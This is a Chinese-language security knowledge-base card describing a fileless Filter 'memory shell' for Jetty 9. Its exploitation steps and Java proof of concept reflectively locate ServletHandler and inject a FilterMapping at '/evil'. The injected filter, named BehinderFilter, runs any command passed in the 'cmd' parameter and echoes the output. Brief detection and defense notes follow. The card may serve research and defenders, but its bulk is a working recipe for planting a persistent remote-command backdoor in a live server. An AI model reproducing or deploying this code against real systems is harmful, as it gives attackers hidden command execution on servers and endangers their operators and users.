---
id: web-java-component-jetty9-servlethandler-filter-memshell
title: Jetty 9 Filter 内存马：反射取 ServletHandler._filterPathMappings 注入 FilterMapping
type: scenario
domain: web
path: web/java/component
technique: jetty9-servlethandler-filter-memshell
tags:
- java
- jetty
- memshell
- filter
- servlethandler
- reflection
- classloader
- javax-servlet
cve: []
severity: critical
confidence: high
affected_versions: Jetty 9.0.7.v20131107（原文验证版本）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:15:49+08:00'
  notes: 已对照原文与43张图核对：FilterChain 由 ServletHandler.getFilterChain 遍历 _filterPathMappings 构建（图07/08）、FilterMapping 的 setFilterName/setFilterHolder(包级)/setPathSpec 与 setFilterHolder 内同步 _filterName（图11-15）、FilterHolder(Filter) 构造调 setFilter（图22）、9.4.44 setFilter→setInstance 只写 _instance（图23/34-36）、9.0.7 setFilter 直接写 _filter（图24）、TCCL→_context→_servletHandler（图09）、9.4.44 注入后 _filter=null/_state=0（图21）均与卡片一致。未验证点：未本机复跑；对象搜索依赖 JOS/TCCL 环境，真实部署需按环境调整；affected_versions 按原文 9.0.7 验证版本保留（非厂商受影响区间）；frontmatter 无 sources/source_url。dup-scan 与本篇 Servlet 卡、FilterHolder 卡报 likely_duplicate，经原文裁决：Filter 走 _filterPathMappings，Servlet 走 _servlets/_servletMappings 与 addServlet/addServletMapping，FilterHolder 卡解决 9.4.44 生命周期初始化，三者是不同机制/不同版本问题，非同一链改写，四卡并列保留，不删除。
url: /docs/web/java/component/web-java-component-jetty9-servlethandler-filter-memshell/
draft: false
kb_aliases:
- Jetty Filter 内存马
- Jetty 9 内存马
- _filterPathMappings
- ServletHandler 内存马
- BehinderFilter
- Jetty 无文件马
---

## 一句话结论

Jetty 9 的 `ServletHandler` 用 `_filterPathMappings`（`ArrayList<FilterMapping>`）在每次请求时构建 FilterChain；只要从当前线程的 WebApp 上下文取到 `ServletHandler`，用容器自身的类加载器反射构造 `FilterHolder`/`FilterMapping`，把 `pathSpec` 设为攻击路径并追加到该列表，就能在不改 web.xml、不落盘的情况下注册一个执行命令的 Filter 内存马。

## 原理

- **FilterChain 的来源**：`ServletHandler.getFilterChain()` 遍历 `_filterPathMappings`，对每个 `FilterMapping` 调用 `appliesTo(pathInContext, dispatch)`，命中后用 `newFilterChain(mapping.getFilterHolder(), ...)` 把 Filter 串进处理链。也就是说，路由匹配完全依赖这个内存列表，修改它等价于注册 Filter。
- **FilterMapping 的字段与 setter**：`_filterName`、`_holder`、`_pathSpecs` 分别由 `setFilterName`、`setFilterHolder`（包级私有）、`setPathSpec` 设置；`setFilterHolder` 内部还会用 `holder.getName()` 同步 `_filterName`，所以要先给 holder 设名字。
- **FilterHolder**：`FilterHolder(Filter)` 构造器会调用 `setFilter(filter)`；`setName` 在父类 `Holder` 上。Jetty 9.0.7 的 `setFilter` 直接把实例写入 `_filter`；9.4.44 改为 `setInstance`，只写 `_instance`，需额外调用 `initialize()`（见高版本卡）。
- **ServletHandler 的获取**：原文环境（Jetty Maven 插件）里 `Thread.currentThread().getContextClassLoader()` 是 `WebAppClassLoader`，其 `_context` 字段指向 `WebAppContext`，后者 `_servletHandler` 即目标。真实部署中 TCCL 不一定是 WebApp 加载器，可用 JOS/对象搜索从当前请求、`ServletContextHandler` 或已注册 Servlet 反查；核心是找到活着的 `ServletHandler` 实例。
- **类加载器身份**：容器内部的 `FilterMapping`/`FilterHolder` 由 WebApp 类加载器加载；内存马类若由另一个加载器加载，直接 `new FilterMapping()` 会得到同名不同 Class 的对象，加入列表后强转抛 `ClassCastException`。必须用 `servletHandler.getClass().getClassLoader().loadClass(...)` 构造（详见类加载器卡）。
- **为什么无文件**：只修改运行期对象图，不写 JSP/class 到磁盘；进程重启后内存马消失，但在存活期间每次命中路径都会执行 `doFilter`。

## 触发条件

- 目标为 Jetty 9.x（`javax.servlet` API），原文实测验证明 9.0.7.v20131107；9.4.44 需要初始化绕过。
- 攻击者已能在目标 JVM 内执行 Java 代码或加载字节码（反序列化、表达式注入、JSP、TemplatesImpl 等）。
- 能取得 `ServletHandler` 实例（TCCL 链、请求对象或对象搜索）。
- 目标路径未被现有 Servlet/Filter 完全遮蔽；Filter 的 `pathSpec` 可用 `/*` 或具体路径。
- 未部署能检测 `_filterPathMappings` 反射修改、异常 Filter 注册或动态类加载的 RASP。

## 利用步骤

1. **取 ServletHandler**：从 `Thread.currentThread().getContextClassLoader()` 逐层取 `_context`、`_servletHandler`；失败时改用请求对象/`ServletContextHandler` 反查。
2. **建 FilterHolder**：用 `servletHandler.getClass().getClassLoader()` 加载 `org.eclipse.jetty.servlet.FilterHolder`，反射无参构造；`setFilter(filter)` 写入内存马 Filter，`setName("BehinderFilter")` 设名字。
3. **建 FilterMapping**：同样用容器加载器加载 `FilterMapping`，反射无参构造；`setFilterHolder(holder)`（参数类型要用 holder 的实际 Class）、`setPathSpec("/evil")`。
4. **挂载**：反射取 `servletHandler._filterPathMappings`，`add(mapping)`。
5. **触发**：访问 `/evil?cmd=whoami`，`doFilter` 执行命令并把输出写回响应；随后 `chain.doFilter` 继续原链路。
6. **验证与清理**：确认命令回显；测试结束重启进程或移除 mapping，避免残留。

## PoC

```java
// 精简骨架；getFieldValue/getMethod 为沿继承链查找并 setAccessible 的工具方法
Object thread = Thread.currentThread();
Object loader = getFieldValue(thread, "contextClassLoader");
Object context = getFieldValue(loader, "_context");
Object servletHandler = getFieldValue(context, "_servletHandler");

ClassLoader cl = servletHandler.getClass().getClassLoader();

// FilterHolder：必须用容器加载器，避免同名类身份不同
Object holder = cl.loadClass("org.eclipse.jetty.servlet.FilterHolder")
        .getDeclaredConstructor().newInstance();
holder.getClass().getDeclaredMethod("setFilter", javax.servlet.Filter.class)
        .invoke(holder, new BehinderFilter());
holder.getClass().getSuperclass().getDeclaredMethod("setName", String.class)
        .invoke(holder, "BehinderFilter");

// FilterMapping
Object mapping = cl.loadClass("org.eclipse.jetty.servlet.FilterMapping")
        .getDeclaredConstructor().newInstance();
java.lang.reflect.Method setHolder = mapping.getClass()
        .getDeclaredMethod("setFilterHolder", holder.getClass());
setHolder.setAccessible(true);
setHolder.invoke(mapping, holder);
mapping.getClass().getDeclaredMethod("setPathSpec", String.class)
        .invoke(mapping, "/evil");

// 追加到内存列表
java.util.ArrayList list = (java.util.ArrayList) getFieldValue(servletHandler, "_filterPathMappings");
list.add(mapping);
```

Filter 的 `doFilter` 最小实现：取 `request.getParameter("cmd")`，`Runtime.getRuntime().exec(cmd)`，读进程输出写入 `response.getOutputStream()`，最后 `chain.doFilter(request, response)`。

## 变体与关联

- **高版本 Jetty 9.4.44+**：`setFilter` 只写 `_instance`，还需 `setStarted()` + `setServletHandler()` + `initialize()` 才能让 `_filter` 就绪；见 [[web-java-component-jetty9-filterholder-initialize-bypass]]。
- **Servlet 型内存马**：改 `_servlets`/`_servletMappings`，用 `addServlet`/`addServletMapping` 注册，见 [[web-java-component-jetty9-servlethandler-servlet-memshell]]。
- **类加载器身份问题**：直接用 `new FilterMapping()` 会抛同名类 `ClassCastException`，见 [[web-java-classloader-container-type-identity-memshell]]。
- **Jetty 10/11**：改用 `jakarta.servlet`，旧 `javax.servlet` Filter 直接 `ClassNotFoundException`；可改用 ThreadLocal 取 `HttpConnection` 的无 API 方式，见 [[web-java-component-jetty11-threadlocal-header-memshell]]。
- **对照**：Tomcat 的 `StandardContext.filterConfigs`/`ApplicationFilterFactory` 内存马思路一致，但字段与类名不同。

## 检测与防御

- **检测**：运行期检查 `ServletHandler._filterPathMappings` 中是否存在 classloader 异常、类名可疑或 pathSpec 为攻击路径的 FilterMapping；监控对 `_filterPathMappings` 的反射写、对 `FilterMapping.setFilterHolder` 的调用；检查无对应 web.xml 条目的 Filter。
- **防御**：修补反序列化/表达式注入入口，阻止任意字节码加载；对 RASP 增加内存马扫描（遍历 Filter/Servlet 列表比对 web.xml）；Jetty 升级到受支持版本并限制 `defineClass`；发现后重启进程并轮换凭据。
- **边界**：内存马随进程存活，重启即失效；若目标 TCCL 链不同，需改用请求对象或对象搜索定位 ServletHandler。
